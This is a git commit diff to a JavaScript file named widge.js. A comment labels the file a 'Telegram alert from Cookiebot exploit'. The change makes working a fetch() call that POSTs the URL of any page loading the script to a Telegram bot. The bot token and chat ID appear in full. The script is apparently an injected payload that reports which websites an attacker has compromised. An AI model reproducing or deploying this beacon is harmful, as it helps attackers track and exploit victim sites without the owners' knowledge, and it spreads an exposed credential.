d378e88f8c5d82fe362484c078263f8f00306617
redatahamoo <redaatahamoo@gmail.com>
2025-06-19 14:25:55 +0300

    Update widge.js

--- Scripts/widge.js
+++ Scripts/widge.js
@@ -1,11 +1,11 @@
 // 🚨 Telegram alert from Cookiebot exploit
-fetch("https://api.telegram.org/bot<7418874172:AAFy2mvuxosCEGJEKUls4EoXaSIcjfJ82Ac>/sendMessage", {
+fetch("https://api.telegram.org/bot7418874172:AAFy2mvuxosCEGJEKUls4EoXaSIcjfJ82Ac/sendMessage", {
   method: "POST",
   headers: {
     "Content-Type": "application/json"
   },
   body: JSON.stringify({
-    chat_id: "<6929699769>",
+    chat_id: "6929699769",
     text: "🚨 Cookiebot تم استغلاله في: " + location.href
   })
 });
